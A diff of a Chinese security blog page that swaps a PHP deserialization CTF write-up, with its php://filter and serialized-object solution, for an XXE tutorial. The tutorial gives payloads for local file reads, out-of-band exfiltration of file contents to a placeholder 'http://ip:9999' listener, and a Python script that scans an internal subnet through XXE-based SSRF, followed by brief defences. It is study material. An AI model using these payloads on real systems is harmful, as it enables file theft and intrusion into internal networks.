@@ -16,7 +16,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>PHP序列化 - blog</title>
+  <title>XXE - blog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
@@ -117,7 +117,7 @@
               
                 <p class="mt-3 post-meta">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  星期四, 九月 13日 2018, 11:01 晚上
+                  星期一, 三月 9日 2020, 11:42 晚上
                 </p>
               
 
@@ -126,7 +126,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    786 字
+                    1.4k 字
                   </span>
                 
 
@@ -134,7 +134,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      3 分钟
+                      6 分钟
                   </span>
                 
 
@@ -168,134 +168,124 @@
         <div class="post-content mx-auto" id="post">
           
           <div class="markdown-body">
-            <h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p> 在PHP中，序列化用于存储或传递 PHP 的值（比如数组或者类的值）的过程中，同时不丢失其类型和结构。大概就是将数组和类的值转换成字符串来传值。</p>
-<p>序列化</p>
-<ul>
-<li>serialize ( mixed $value )</li>
-</ul>
-<p>反序列化</p>
-<ul>
-<li>unserialize ( mixed $value )</li>
-</ul>
-<h3 id="序列化例子"><a href="#序列化例子" class="headerlink" title="序列化例子"></a>序列化例子</h3><h4 id="类的序列化"><a href="#类的序列化" class="headerlink" title="类的序列化"></a>类的序列化</h4><pre><code>class test
-{
-    var $name;
-    var $age;
-    function __construct($name,$age)
-    {
-        $this -&gt; name = $name;
-        $this -&gt; age = $age;
-
-    }
-}
-
-$test1 = new test(&#39;lmt&#39;,&#39;3&#39;);
-echo &quot;before serialize&lt;br&gt;&quot;;
-
-var_dump($test1);
-echo &quot;&lt;br&gt; after serialize &lt;br&gt;&quot;;
-
-var_dump(serialize($test1));</code></pre><p>输出结果</p>
+            <h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>介绍dtd，一句话说就是用来规范xml中的标签和内容（元素和属性）<br><img src="/img/xxe1.png" srcset="/img/loading.gif" alt="dtd"><br>而XXE漏洞就出现在调用dtd</p>
 <blockquote>
-<p>O:4:”test”:2:{s:4:”name”;s:3:”lmt”;s:3:”age”;s:1:”3”;}</p>
+<p>&lt;!ENTITY xxe SYSTEM “file:///c:/test.dtd” &gt;  </p>
 </blockquote>
+<p>就像这里，调用了c盘的test.dtd来规范我们的xml，但此时换成读其他文件，就造成了安全问题。</p>
+<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="内部-外部"><a href="#内部-外部" class="headerlink" title="内部/外部"></a>内部/外部</h3><p>内部：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre><p>外部：  </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;
+&lt;creds&gt;
+    &lt;user&gt;&amp;xxe;&lt;/user&gt;
+    &lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;</code></pre><p>从外部应用dtd文件，方便资源更新。<br>也可从公共dtd引用</p>
 <blockquote>
-<p>O:4:”test”:2：表示，序列化的是一个类（object），类名的长度为4，类中有两个变量名</p>
+<p>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;  </p>
 </blockquote>
-<h3 id="序列化相关的题"><a href="#序列化相关的题" class="headerlink" title="序列化相关的题"></a>序列化相关的题</h3><p>welcome to the bugku</p>
-<p><a href="http://123.206.87.240:8006/test1/" target="_blank" rel="noopener">http://123.206.87.240:8006/test1/</a></p>
-<pre><code>$user = $_GET[&quot;txt&quot;];  
-$file = $_GET[&quot;file&quot;];  
-$pass = $_GET[&quot;password&quot;];  
-if(isset( $user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;))
-{  
- echo &quot;hello admin!&lt;br&gt;&quot;;  
- include($file); //hint.php  
-}
-else
-{  
- echo &quot;you are not admin ! &quot;;  
-}</code></pre><p>很显然想让我们利用源码去得到flag。</p>
-<p>开始有三个变量：user,file,pass，但是我们发现这里的pass也就是password没有什么用，所以我们重点关注前两个变量。看下面的条件</p>
-<p>（1）这里isset的意思是查看变量是否存在，即user不能为空。<br>（2）file_get_contents是把整个文件读入字符串中，这里也就是把user这个变量（user显然要是一个文件）的内容以字符串的方式读出来并且要和“welcome to the bugkuctf”完全相等（类型，内容）。</p>
-<ul>
-<li>file_get_contents($user,’r’)<br>（3）后面提示了我们所以我们要在满足条件之后读取file=hint.php。</li>
-<li>include($file); //hint.php</li>
-</ul>
-<p>这里就要使用php伪协议了。这道题目为了解决第二个条件，要用到    “php://input”协议。<br>然后我们在文件包含出hint.PHP</p>
-<ul>
-<li><a href="http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php" target="_blank" rel="noopener">http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</a></li>
-</ul>
-<p><img src="/img/2.png" srcset="/img/loading.gif" alt="图片"></p>
-<p>解码：</p>
-<pre><code>#hint.php  
+<p>外部引用可支持http，file等协议，不同的语言支持的协议不同.</p>
+<h3 id="通用-参数"><a href="#通用-参数" class="headerlink" title="通用/参数"></a>通用/参数</h3><p><strong>通用实体</strong>:在dtd定义，xml引用。<br>定义：</p>
+<blockquote>
+<p>&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;  </p>
+</blockquote>
+<p>引用：  </p>
+<blockquote>
+<p>&amp;实体名称；</p>
+</blockquote>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt; 
+&lt;updateProfile&gt;  
+    &lt;firstname&gt;Joe&lt;/firstname&gt;  
+    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  
+    ... 
+&lt;/updateProfile&gt;</code></pre><p><strong>参数实体</strong>:dtd中定义，dtd中引用<br>定义：</p>
+<blockquote>
+<p>&lt;!ENTITY % 实体名称 “实体的值”&gt;<br>&lt;!ENTITY % 实体名称 SYSTEM “URI/URL”&gt;</p>
+</blockquote>
+<p>引用：  </p>
+<blockquote>
+<p>%实体名称；  </p>
+</blockquote>
+<p>ps：定义时%后有个空格，引用没有。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="无回显读取文件"><a href="#无回显读取文件" class="headerlink" title="无回显读取文件"></a>无回显读取文件</h3><p>test.dtd</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:9999?p=%file;&#39;&gt;&quot;&gt;</code></pre><p>payload:</p>
+<pre><code>&lt;!DOCTYPE convert [ 
+&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;
+%remote;%int;%send;
+]&gt;</code></pre><p>在攻击机上监听9999端口就能获取所读文件   </p>
+<p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 &amp;#37;)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
+<h3 id="有回显读取特殊内容文件"><a href="#有回显读取特殊内容文件" class="headerlink" title="有回显读取特殊内容文件"></a>有回显读取特殊内容文件</h3><p>当读取当文件内容包含&lt;&gt;&amp;“之类等字符，为了不让xml解析器解析，使用CDATA去标示。此处采用参数实体。<br>evil.dtd</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
+&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code></pre><p>payload</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE roottag [
+&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
+&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  
+&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
+&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; 
+%dtd; ]&gt; 
 
-&lt;?php    
+&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre><h3 id="探测内网"><a href="#探测内网" class="headerlink" title="探测内网"></a>探测内网</h3><p>可理解为ssrf，通过XXE的方式实现ssrf。</p>
+<h4 id="探测ip"><a href="#探测ip" class="headerlink" title="探测ip"></a>探测ip</h4><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE creds [  
+&lt;!ENTITY goodies SYSTEM &quot;php://filter/convert.base64-encode/resource=http://127.0.0.0&quot;&gt; ]&gt;
+&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>根据响应时间判断存活。利用脚本或bp重放探测。<br>脚本</p>
+<pre><code>import requests
+import base64
 
-class Flag{//flag.php    
-    public $file;    
-    public function __tostring(){    
-        if(isset($this-&gt;file)){    
-            echo file_get_contents($this-&gt;file);   
-            echo &quot;&lt;br&gt;&quot;;  
-        return (&quot;good&quot;);  
-        }    
-    }    
-}    
-?&gt;    </code></pre><p>利用伪协议包含出index.php</p>
-<pre><code>#index.php  
-&lt;?php    
-$txt = $_GET[&quot;txt&quot;];    
-$file = $_GET[&quot;file&quot;];    
-$password = $_GET[&quot;password&quot;];    
+#Origtional XML that the server accepts
+#&lt;xml&gt;
+#    &lt;stuff&gt;user&lt;/stuff&gt;
+#&lt;/xml&gt;
 
-if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){    
-    echo &quot;hello friend!&lt;br&gt;&quot;;    
-    if(preg_match(&quot;/flag/&quot;,$file)){   
-        echo &quot;不能现在就给你flag哦&quot;;  
-        exit();    
-    }else{    
-        include($file);     
-        $password = unserialize($password);    
-        echo $password;    
-    }    
-}else{    
-    echo &quot;you are not the number of bugku ! &quot;;    
-}    
 
-?&gt;    
+def build_xml(string):
+    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;
+    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;
+    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;
+    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;
+    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;
+    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;
+    send_xml(xml)
 
-&lt;!--    
-$user = $_GET[&quot;txt&quot;];    
-$file = $_GET[&quot;file&quot;];    
-$pass = $_GET[&quot;password&quot;];    
-
-if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){    
-    echo &quot;hello admin!&lt;br&gt;&quot;;    
-    include($file); //hint.php    
-}else{    
-    echo &quot;you are not admin ! &quot;;    
-}    
- --&gt;    </code></pre><p>indep.php中 <strong>preg_match(“/flag/“,$file)</strong> 不能直接包含出flag.php</p>
-<p>但是hint.php里有 <strong>class Flag{//flag.php</strong><br>以及</p>
-<pre><code>include($file);     
-  $password = unserialize($password);    
-  echo $password;    </code></pre><p>所以这里file参数须是hint.php，因为只有在hint.php中才会包含类Flag<br>然后我们构造password把参数传进hint.php</p>
-<pre><code>&lt;?php  
-    class Flag{
-    public $file;    
-    }    
-
-    $a = new Flag();  
-    $a-&gt;file = &quot;flag.php&quot;;  
-    $a = serialize($a);  
-    print_r($a);  
-?&gt;  </code></pre><p>输出</p>
-<ul>
-<li>O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</li>
-</ul>
-<p><img src="/img/3.png" srcset="/img/loading.gif" alt="3"></p>
-<p><img src="/img/4.png" srcset="/img/loading.gif" alt="4"></p>
+def send_xml(xml):
+    headers = {&#39;Content-Type&#39;: &#39;application/xml&#39;}
+    x = requests.post(&#39;http://34.200.157.128/CUSTOM/NEW_XEE.php&#39;, data=xml, headers=headers, timeout=5).text
+    coded_string = x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value
+    print coded_string
+#   print base64.b64decode(coded_string)
+for i in range(1, 255):
+    try:
+        i = str(i)
+        ip = &#39;10.0.0.&#39; + i
+        string = &#39;php://filter/convert.base64-encode/resource=http://&#39; + ip + &#39;/&#39;
+        print string
+        build_xml(string)
+    except:
+continue</code></pre><h4 id="探测端口"><a href="#探测端口" class="headerlink" title="探测端口"></a>探测端口</h4><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE creds [  
+&lt;!ENTITY goodies SYSTEM &quot;php://filter/convert.base64-encode/resource=http://127.0.0.1:22&quot;&gt; ]&gt;
+&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><h4 id="探测内网web"><a href="#探测内网web" class="headerlink" title="探测内网web"></a>探测内网web</h4><p>1.读web源码<br>2.通过jar协议上传文件；通过ftp协议结合 CRLF 注入攻击SMTP服务器等</p>
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>1.文件上传解析处<br>现代Excel文件实际上只是XML文档的zip文件。这称为Office Open XML格式或OOXML。<br>许多应用程序允许上传文件。有些处理内部数据并采取相应的操作，这几乎肯定需要解析XML。如果解析器未安全配置，则XXE几乎是不可避免的。</p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>1.禁用外部实体<br>如php：<br>libxml_disable_entity_loader(true);<br>2.过滤关键字</p>
+<p>参考：<br><a href="https://xz.aliyun.com/t/3357#toc-21" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-21</a><br><a href="https://www.cnblogs.com/flokz/p/xxe.html" target="_blank" rel="noopener">https://www.cnblogs.com/flokz/p/xxe.html</a><br><a href="https://www.uedbox.com/post/28999/" target="_blank" rel="noopener">https://www.uedbox.com/post/28999/</a><br><a href="https://blog.csdn.net/q547550831/article/details/50541424" target="_blank" rel="noopener">https://blog.csdn.net/q547550831/article/details/50541424</a></p>
+<p>思考：<br>1.无回显读文件时  </p>
+<blockquote>
+<p>&lt;!ENTITY % int “&lt;!ENTITY % send SYSTEM ‘<a href="http://ip:9999?p=%file;&#39;&gt;&quot;&gt;" target="_blank" rel="noopener">http://ip:9999?p=%file;&#39;&gt;&quot;&gt;</a>  </p>
+</blockquote>
+<p>为什么在实体中建实体，为什么</p>
+<blockquote>
+<p>&lt;!ENTITY % int “<a href="http://ip:9999?p=%file;&quot;&gt;" target="_blank" rel="noopener">http://ip:9999?p=%file;&quot;&gt;</a>   </p>
+</blockquote>
+<p>不行<br>2.xml解析和传递流程</p>
 
             <hr>
           </div>
@@ -304,15 +294,6 @@ if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome t
             <p>
             
               
-              <span>
-                <i class="iconfont icon-tag"></i>
-                
-                  <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
-                
-                  <a class="hover-with-bg" href="/tags/%E5%BA%8F%E5%88%97%E5%8C%96/">序列化</a>
-                
-              </span>
-            
             </p>
             
           </div>
@@ -511,7 +492,7 @@ if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome t
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "PHP序列化&nbsp;",
+        "XXE&nbsp;",
       ],
       cursorChar: "🐶",
       typeSpeed: 70,
